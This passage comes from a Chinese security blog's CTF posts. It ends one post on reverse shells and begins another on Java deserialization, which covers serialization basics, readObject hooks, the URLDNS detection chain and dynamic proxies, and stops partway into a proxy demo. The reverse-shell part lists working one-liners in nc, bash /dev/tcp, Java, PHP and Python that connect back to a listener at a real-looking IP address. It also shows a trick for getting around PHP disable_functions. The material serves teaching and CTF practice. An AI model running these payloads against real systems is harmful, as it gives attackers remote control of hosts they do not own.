class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nc  124.221.124.106 3344 -e /bin/sh<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202301310255233.jpg" alt="image-20220926013811064"></p><blockquote><p>如果目标主机linux发行版本没有 -e 参数，还有以下几种方式：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">rm <span class="hljs-regexp">/tmp/</span>f ; mkfifo <span class="hljs-regexp">/tmp/</span>f;cat <span class="hljs-regexp">/tmp/</span>f | <span class="hljs-regexp">/bin/</span>bash -i <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span> | nc x.x.x.x <span class="hljs-number">2333</span> &gt;<span class="hljs-regexp">/tmp/</span>f<br></code></pre></td></tr></table></figure><p><img src="/../../../Pictures/%60nc%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%E5%8F%8A%E5%8F%8D%E5%BC%B9shell%E7%BB%86%E8%8A%82%60/e6c9d24egy1h6kgeanctvj21r80l6tiz.jpg" alt="image-20220927000457356"></p><ul><li><code>rm /tmp/f</code> 删除命令</li><li><code>mkfifo /tmp/f;</code> 在tmp目录下写fifo文件f</li><li><code>/bin/bash -i 2&gt;&amp;1</code> 将&#x2F;bin&#x2F;bash 的标准错误重定向到标准输出</li><li><code>nc x.x.x.x 2333 &gt;/tmp/f</code>将nc监听到的输入 输入到fifo</li><li><code>cat /tmp/f</code> 将执行结果回显</li></ul></blockquote><h3 id="bash弹shell"><a href="#bash弹shell" class="headerlink" title="bash弹shell"></a>bash弹shell</h3><p>这也是常用的反弹shell payload</p><p>⚠️注意：java命令执行时，会根据空格分割参数。因此最好不要直接传类似下面第二条这种</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">bash -i &gt;&amp; /dev/tcp/124.221.124.106/3344 0&gt;&amp;1<br>bash -c &quot;bash -i &amp;&gt; /dev/tcp/124.221.124.106/3344 0&gt;&amp;1&quot;   #适用sh<br><span class="hljs-meta prompt_">#</span><span class="language-bash">适配java的</span><br>String[] s = &#123;&quot;bash&quot;,&quot;-c&quot;,&quot;&#x27;bash -i &amp;&gt; /dev/tcp/124.221.124.106/3344 0&gt;&amp;1&#x27;&quot;&#125;;<br>Runtime.getRuntime().exec(s);<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202301310255967.jpg" alt="image-20220927204310944"></p><table><thead><tr><th>命令</th><th>参数解释</th></tr></thead><tbody><tr><td>bash -i</td><td>产生一个 bash 交互环境</td></tr><tr><td>&gt;&amp;</td><td>将联合符号前面的内容与后面结合然后一起重定向给后者</td></tr><tr><td>&#x2F;dev&#x2F;tcp&#x2F;10.211.55.4&#x2F;2333</td><td>打开<code>/dev/tcp</code>这个文件就类似于发出了一个socket调用，建立一个socket连接,后面跟目标ip和目标端口</td></tr><tr><td>0&gt;&amp;1</td><td>使得攻击方可以看到输入到命令以及执行结果</td></tr></tbody></table><blockquote><ul><li><p>其实<code>/dev/tcp</code>在根目录下并不存在，之所以能在命令中使用，是因为bash源码对其做了相关预定义</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202301310255199.jpg" alt="image-20220926171832801"></p></li><li><p>如果攻击目标是mac os系统，使用内网弹shell的payload可以成功，bash弹shell的payload可能失败</p><ul><li><p>原因：现在的mac都已经使用zsh作为默认shell，而zsh并没有对<code>/dev/tcp</code>做相关处理，执行payload会回显</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">zsh: no such file or directory: /proc/net/tcp/110.42.158.239/2333<br></code></pre></td></tr></table></figure></li><li><p>如果要使用bash弹shell要先切换当前使用shell，可以<code>sudo su</code>输入当前用户密码切换到root用户，默认使用sh</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202301310256550.jpg" alt="image-20220926172537373"></p></li><li><p>或者更改shell为bash</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">chsh -s /bin/bash<br></code></pre></td></tr></table></figure></li></ul></li></ul></blockquote><h4 id="其他形式"><a href="#其他形式" class="headerlink" title="其他形式"></a>其他形式</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">exec 5&lt;&gt;/dev/tcp/x.x.x.x/4444;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done<br><br>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 124.221.124.106 3344 &gt; /tmp/f<br></code></pre></td></tr></table></figure><blockquote><ul><li>第一条命令 建立与x.x.x.x:4444的tcp连接，并将标准输入输出作为device 5的标准输入输出</li><li>第二条cat &lt;&amp;5 获取device5的输入; <code>while read line; do $line 2&gt;&amp;5 &gt;&amp;5</code> 一旦获取到命令便运行 然后将标准输入输出以及标准错误输出到device5中</li></ul></blockquote><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202301310256792.jpg" alt="image-20220926224353002"></p><h3 id="基于编程语言的反弹shell"><a href="#基于编程语言的反弹shell" class="headerlink" title="基于编程语言的反弹shell"></a>基于编程语言的反弹shell</h3><p>1、基于PHP的反弹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">php -r &#x27;$sock=fsockopen(&quot;ip&quot;,4444);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;<br></code></pre></td></tr></table></figure><p>2、基于python反弹shell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((&quot;ip&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;<br></code></pre></td></tr></table></figure><blockquote><p>使用socket建立起tcp连接</p><p>os.dup2() 方法用于将一个文件描述符 fd 复制到另一个 fd2，这里将标准输入、标准输出、标准错误都集成到当前socket的文件描述符上,然后再产生一个 bash 交互环境</p></blockquote><p>2、受到disable_functions影响，导致fsockopen或者exec不可用。<br>当监听端收不到连接就是fsockopen被禁用，又或者收到连接后又立马断开则是exec被禁用<br>解决方法：<br>php在命令行中执行时修改 php.ini 是立即生效的，因此我们直接重命名php.ini文件即可:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">mv /etc/php.ini /etc/php.ini.bak<br></code></pre></td></tr></table></figure><p>当然，文件位置并不是一定在这里。可以把常用位置都试一遍。当然了，实战中可千万不要这么搞，业务烂了就呜呜呜了。</p><p>参考博客:</p><ol><li><a href="https://blog.csdn.net/haoge1998/article/details/124259580?spm=1001.2101.3001.6650.6&utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-6-124259580-blog-102993592.pc_relevant_aa&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-6-124259580-blog-102993592.pc_relevant_aa">反弹shell原理</a></li><li><a href="https://www.sqlsec.com/2019/10/nc.html">nc命令教程</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shell </tag>
            
            <tag> nc </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java反序列化</title>
      <link href="/2022/09/23/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2022/09/23/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="Java反序列化"><a href="#Java反序列化" class="headerlink" title="Java反序列化"></a>Java反序列化</h1><h2 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h2><p><code>Java</code>相对<code>PHP</code>序列化更深入的地方在于，其提供了更加高级、灵活地方法 <code>writeObject</code> ，允许开发者在序列化流中插入一些自定义数据，进而在反序列化的时候能够使用 <code>readObject</code> 进行读取。</p><p><code>Java</code>设计 <code>readObject</code> 的思路和<code>PHP</code>的 <code>__wakeup</code> 不同点在于： <code>readObject</code> 倾向于解决”反序列化时如何还原一个完整对象”这个问题，而<code>PHP</code>的 <code>__wakeup</code> 更倾向于解决“反序列化后如何初始化这个对象”的问题。</p><p>在Java中实现对象反序列化非常简单，实现<code>java.io.Serializable(内部序列化)</code>或<code>java.io.Externalizable(外部序列化)</code>接口即可被序列化，其中<code>java.io.Externalizable</code>接口只是实现了<code>java.io.Serializable</code>接口。</p><p>反序列化类对象时有如下限制：</p><ol><li>被反序列化的类必须存在。</li><li><code>serialVersionUID</code>值必须一致。</li></ol><h2 id="ObjectInputStream、ObjectOutputStream"><a href="#ObjectInputStream、ObjectOutputStream" class="headerlink" title="ObjectInputStream、ObjectOutputStream"></a>ObjectInputStream、ObjectOutputStream</h2><p><code>java.io.ObjectOutputStream</code>类最核心的方法是<code>writeObject</code>方法，即序列化类对象。</p><p><code>java.io.ObjectInputStream</code>类最核心的功能是<code>readObject</code>方法，即反序列化类对象。</p><p>所以，只需借助<code>ObjectInputStream</code>和<code>ObjectOutputStream</code>类我们就可以实现类的序列化和反序列化功能了。</p><h3 id="反序列化接口"><a href="#反序列化接口" class="headerlink" title="反序列化接口"></a>反序列化接口</h3><p>java中的unserializable接口是空的，所以实现该接口不用重写什么方法</p><blockquote><ul><li><p>反序列化过程中，绕过它的父类没有实现序列化接口，那么要提高无参构造函数来重新创建对象</p></li><li><p>一个实现Serializable接口的子类也可以被序列化</p></li><li><p>实现了<strong>Serializable</strong>或者 <strong>Externalizable</strong>接口的类的对象才能被序列化为字节序列</p></li><li><p>静态成员变量是不能被序列化（序列化针对对象属性）</p></li><li><h5 id="transient-标识的对象成员变量不参与序列化"><a href="#transient-标识的对象成员变量不参与序列化" class="headerlink" title="transient 标识的对象成员变量不参与序列化"></a>transient 标识的对象成员变量不参与序列化</h5></li></ul></blockquote><h3 id="java-io-Serializable"><a href="#java-io-Serializable" class="headerlink" title="java.io.Serializable"></a>java.io.Serializable</h3><p>这是一个空的接口，某个类实现了该接口可以标识该类可以序列化，我们不需要实现<code>java.io.Serializable</code>的任何方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Serializable</span> &#123;<br>&#125;<br></code></pre></td></tr></table></figure><p>实现了<code>java.io.Serializable</code>接口的类原则上都需要生产一个<code>serialVersionUID</code>常量，反序列化时如果双方的<code>serialVersionUID</code>不一致会导致<code>InvalidClassException</code> 异常，如果可序列化类未显式声明 <code>serialVersionUID</code>，则序列化运行时将基于该类的各个方面计算该类的默认 <code>serialVersionUID</code>值。</p><p><code>DeserializationTest.java</code>测试代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.anbai.sec.serializes;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.util.Arrays;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Creator: yz</span><br><span class="hljs-comment"> * Date: 2019/12/15</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DeserializationTest</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br><br><span class="hljs-keyword">private</span> String username;<br><br><span class="hljs-keyword">private</span> String email;<br><br><span class="hljs-comment">// 省去get/set方法....</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br><br><span class="hljs-keyword">try</span> &#123;<br><span class="hljs-comment">// 创建DeserializationTest类，并类设置属性值</span><br><span class="hljs-type">DeserializationTest</span> <span class="hljs-variable">t</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DeserializationTest</span>();<br>t.setUsername(<span class="hljs-string">&quot;yz&quot;</span>);<br>t.setEmail(<span class="hljs-string">&quot;admin@javaweb.org&quot;</span>);<br><br><span class="hljs-comment">// 创建Java对象序列化输出流对象</span><br><span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br><br><span class="hljs-comment">// 序列化DeserializationTest类</span><br>out.writeObject(t);<br>out.flush();<br>out.close();<br><br><span class="hljs-comment">// 打印DeserializationTest类序列化以后的字节数组，我们可以将其存储到文件中或者通过Socket发送到远程服务地址</span><br>System.out.println(<span class="hljs-string">&quot;DeserializationTest类序列化后的字节数组:&quot;</span> + Arrays.toString(baos.toByteArray()));<br><br><span class="hljs-comment">// 利用DeserializationTest类生成的二进制数组创建二进制输入流对象用于反序列化操作</span><br><span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(baos.toByteArray());<br><br><span class="hljs-comment">// 通过反序列化输入流(bais),创建Java对象输入流(ObjectInputStream)对象</span><br><span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais);<br><br><span class="hljs-comment">//反序列化获取对象</span><br><span class="hljs-type">DeserializationTest</span> <span class="hljs-variable">test</span> <span class="hljs-operator">=</span> (DeserializationTest) in.readObject();<br>System.out.println(<span class="hljs-string">&quot;用户名:&quot;</span> + test.getUsername() + <span class="hljs-string">&quot;,邮箱:&quot;</span> + test.getEmail());<br><br><span class="hljs-comment">// 关闭ObjectInputStream输入流</span><br>in.close();<br>&#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>e.printStackTrace();<br>&#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>e.printStackTrace();<br>&#125;<br>&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>执行结果</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-title class_">DeserializationTest</span>类序列化后的字节数组<span class="hljs-symbol">:</span>[<span class="hljs-number">-84</span>, <span class="hljs-number">-19</span>, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>, <span class="hljs-number">115</span>, <span class="hljs-number">114</span>, <span class="hljs-number">0</span>, <span class="hljs-number">44</span>, <span class="hljs-number">99</span>, <span class="hljs-number">111</span>, <span class="hljs-number">109</span>, <span class="hljs-number">46</span>, <span class="hljs-number">97</span>, <span class="hljs-number">110</span>, <span class="hljs-number">98</span>, <span class="hljs-number">97</span>, <span class="hljs-number">105</span>, <span class="hljs-number">46</span>, <span class="hljs-number">115</span>, <span class="hljs-number">101</span>, <span class="hljs-number">99</span>, <span class="hljs-number">46</span>, <span class="hljs-number">115</span>, <span class="hljs-number">101</span>, <span class="hljs-number">114</span>, <span class="hljs-number">105</span>, <span class="hljs-number">97</span>, <span class="hljs-number">108</span>, <span class="hljs-number">105</span>, <span class="hljs-number">122</span>, <span class="hljs-number">101</span>, <span class="hljs-number">115</span>, <span class="hljs-number">46</span>, <span class="hljs-number">68</span>, <span class="hljs-number">101</span>, <span class="hljs-number">115</span>, <span class="hljs-number">101</span>, <span class="hljs-number">114</span>, <span class="hljs-number">105</span>, <span class="hljs-number">97</span>, <span class="hljs-number">108</span>, <span class="hljs-number">105</span>, <span class="hljs-number">122</span>, <span class="hljs-number">97</span>, <span class="hljs-number">116</span>, <span class="hljs-number">105</span>, <span class="hljs-number">111</span>, <span class="hljs-number">110</span>, <span class="hljs-number">84</span>, <span class="hljs-number">101</span>, <span class="hljs-number">115</span>, <span class="hljs-number">116</span>, <span class="hljs-number">74</span>, <span class="hljs-number">36</span>, <span class="hljs-number">49</span>, <span class="hljs-number">16</span>, <span class="hljs-number">-110</span>, <span class="hljs-number">39</span>, <span class="hljs-number">13</span>, <span class="hljs-number">76</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">76</span>, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>, <span class="hljs-number">101</span>, <span class="hljs-number">109</span>, <span class="hljs-number">97</span>, <span class="hljs-number">105</span>, <span class="hljs-number">108</span>, <span class="hljs-number">116</span>, <span class="hljs-number">0</span>, <span class="hljs-number">18</span>, <span class="hljs-number">76</span>, <span class="hljs-number">106</span>, <span class="hljs-number">97</span>, <span class="hljs-number">118</span>, <span class="hljs-number">97</span>, <span class="hljs-number">47</span>, <span class="hljs-number">108</span>, <span class="hljs-number">97</span>, <span class="hljs-number">110</span>, <span class="hljs-number">103</span>, <span class="hljs-number">47</span>, <span class="hljs-number">83</span>, <span class="hljs-number">116</span>, <span class="hljs-number">114</span>, <span class="hljs-number">105</span>, <span class="hljs-number">110</span>, <span class="hljs-number">103</span>, <span class="hljs-number">59</span>, <span class="hljs-number">76</span>, <span class="hljs-number">0</span>, <span class="hljs-number">8</span>, <span class="hljs-number">117</span>, <span class="hljs-number">115</span>, <span class="hljs-number">101</span>, <span class="hljs-number">114</span>, <span class="hljs-number">110</span>, <span class="hljs-number">97</span>, <span class="hljs-number">109</span>, <span class="hljs-number">101</span>, <span class="hljs-number">113</span>, <span class="hljs-number">0</span>, <span class="hljs-number">126</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">120</span>, <span class="hljs-number">112</span>, <span class="hljs-number">116</span>, <span class="hljs-number">0</span>, <span class="hljs-number">17</span>, <span class="hljs-number">97</span>, <span class="hljs-number">100</span>, <span class="hljs-number">109</span>, <span class="hljs-number">105</span>, <span class="hljs-number">110</span>, <span class="hljs-number">64</span>, <span class="hljs-number">106</span>, <span class="hljs-number">97</span>, <span class="hljs-number">118</span>, <span class="hljs-number">97</span>, <span class="hljs-number">119</span>, <span class="hljs-number">101</span>, <span class="hljs-number">98</span>, <span class="hljs-number">46</span>, <span class="hljs-number">111</span>, <span class="hljs-number">114</span>, <span class="hljs-number">103</span>, <span class="hljs-number">116</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">121</span>, <span class="hljs-number">122</span>]<br>用户名<span class="hljs-symbol">:yz</span>,邮箱<span class="hljs-symbol">:admin</span><span class="hljs-variable">@javaweb</span>.org<br></code></pre></td></tr></table></figure><blockquote><p>核心逻辑其实就是使用<code>ObjectOutputStream</code>类的<code>writeObject</code>方法序列化<code>DeserializationTest</code>类，使用<code>ObjectInputStream</code>类的<code>readObject</code>方法反序列化<code>DeserializationTest</code>类而已。</p></blockquote><p>简化后的代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 序列化DeserializationTest类</span><br><span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>out.writeObject(t);<br><br><span class="hljs-comment">// 反序列化输入流数据为DeserializationTest对象</span><br><span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais);<br><span class="hljs-type">DeserializationTest</span> <span class="hljs-variable">test</span> <span class="hljs-operator">=</span> (DeserializationTest) in.readObject();<br></code></pre></td></tr></table></figure><p><code>ObjectOutputStream</code>序列化类对象的主要流程是首先判断序列化的类是否重写了<code>writeObject</code>方法，如果重写了就调用序列化对象自身的<code>writeObject</code>方法序列化，序列化时会先写入类名信息，其次是写入成员变量信息(通过反射获取所有不包含被<code>transient</code>修饰的变量和值)。</p><h3 id="自定义序列化-writeObject-和反序列化-readObject"><a href="#自定义序列化-writeObject-和反序列化-readObject" class="headerlink" title="自定义序列化(writeObject)和反序列化(readObject)"></a>自定义序列化(writeObject)和反序列化(readObject)</h3><p>实现了<code>java.io.Serializable</code>接口的类，还可以定义如下方法(<code>反序列化魔术方法</code>)，这些方法将会在类序列化或反序列化过程中调用：</p><ol><li><strong><code>private void writeObject(ObjectOutputStream oos)</code>,自定义序列化。</strong></li><li><strong><code>private void readObject(ObjectInputStream ois)</code>，自定义反序列化。</strong></li><li><code>private void readObjectNoData()</code>。</li><li><code>protected Object writeReplace()</code>，写入时替换对象。</li><li><code>protected Object readResolve()</code>。</li></ol><p>序列化时可自定义的方法示例代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DeserializationTest</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 自定义反序列化类对象</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> ois 反序列化输入流对象</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@throws</span> IOException            IO异常</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@throws</span> ClassNotFoundException 类未找到异常</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream ois)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>System.out.println(<span class="hljs-string">&quot;readObject...&quot;</span>);<br><br><span class="hljs-comment">// 调用ObjectInputStream默认反序列化方法</span><br>ois.defaultReadObject();<br><br><span class="hljs-comment">// 省去调用自定义反序列化逻辑...</span><br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 自定义序列化类对象</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> oos 序列化输出流对象</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@throws</span> IOException IO异常</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writeObject</span><span class="hljs-params">(ObjectOutputStream oos)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>oos.defaultWriteObject();<br><br>System.out.println(<span class="hljs-string">&quot;writeObject...&quot;</span>);<br><span class="hljs-comment">// 省去调用自定义序列化逻辑...</span><br>&#125;<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObjectNoData</span><span class="hljs-params">()</span> &#123;<br>System.out.println(<span class="hljs-string">&quot;readObjectNoData...&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 写入时替换对象</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@return</span> 替换后的对象</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">protected</span> Object <span class="hljs-title function_">writeReplace</span><span class="hljs-params">()</span> &#123;<br>System.out.println(<span class="hljs-string">&quot;writeReplace....&quot;</span>);<br><br><span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>&#125;<br><br><span class="hljs-keyword">protected</span> Object <span class="hljs-title function_">readResolve</span><span class="hljs-params">()</span> &#123;<br>System.out.println(<span class="hljs-string">&quot;readResolve....&quot;</span>);<br><br><span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>当我们对<code>DeserializationTest</code>类进行序列化操作时，会自动调用(反射调用)该类的<code>writeObject(ObjectOutputStream oos)</code>方法,对其进行反序列化操作时也会自动调用该类的<code>readObject(ObjectInputStream)</code>方法，也就是说我们可以通过在待<strong>序列化或反序列化的类中定义<code>readObject</code>和<code>writeObject</code>方法，来实现自定义的序列化和反序列化操作</strong>，当然前提是，被序列化的类必须有此方法，并且方法的修饰符必须是<code>private</code>。</p></blockquote><h3 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h3><p><code>URLDNS</code>是一个非常经典的反序列化链。适合用于检测反序列化漏洞，但不能攻击</p><ul><li>使用Java内置的类构造，对第三方库没有依赖</li><li>在⽬标没有回显的时候，能够通过DNS请求得知是否存在反序列化漏洞</li></ul><p>调用链</p><p>HashMap.readObject() -&gt; HashMap.hash() -&gt; java.net.URL.hashCode() -&gt; URLStreamHandler.hashCode() -&gt; URLStreamHandler.getHostAddress() -&gt; InetAddress.getByName()</p><blockquote><blockquote><p>public static InetAddress getByName(String host) throws UnknownHostException<br>确定主机名称的IP地址。<br>主机名称可以是机器名称，例如“ java.sun.com ”或其IP地址的文本表示。 如果提供了文字IP地址，则只会检查地址格式的有效性。</p></blockquote><p><code>java.util.HashMap</code> 实现了 <code>Serializable</code> 接口，重写了 <code>readObject</code>, 在反序列化时会调用 <code>hash</code> 函数计算 key 的 hashCode(需要先设置成-1). 而 <code>java.net.URL</code> 的 <code>hashCode</code> 在计算时会调用 <code>getHostAddress</code> 来解析域名，从而发出 DNS 请求。</p></blockquote><blockquote><p>在目标没有回显的时候,可以确定目标系统上是否存在可控的 <code>readObject()</code> 方法</p></blockquote><h2 id="Java动态代理"><a href="#Java动态代理" class="headerlink" title="Java动态代理"></a>Java动态代理</h2><p>动态代理比较常见的用处就是：<strong>在不修改类的源码的情况下,通过代理的方式为类的方法提供更多的功能</strong></p><p>举个例子来说（这个例子在开发中很常见）：我的开发们实现了业务部分的所有代码，忽然我期望在这些业务代码中多添加日志记录功能的时候，一个一个类去添加代码就会非常麻烦，这个时候我们就能通过动态代理的方式对期待添加日志的类进行代理。</p><p>看一个简单的demo：</p><p>Work接口需要实现work函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Work</span> &#123;<br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">work</span><span 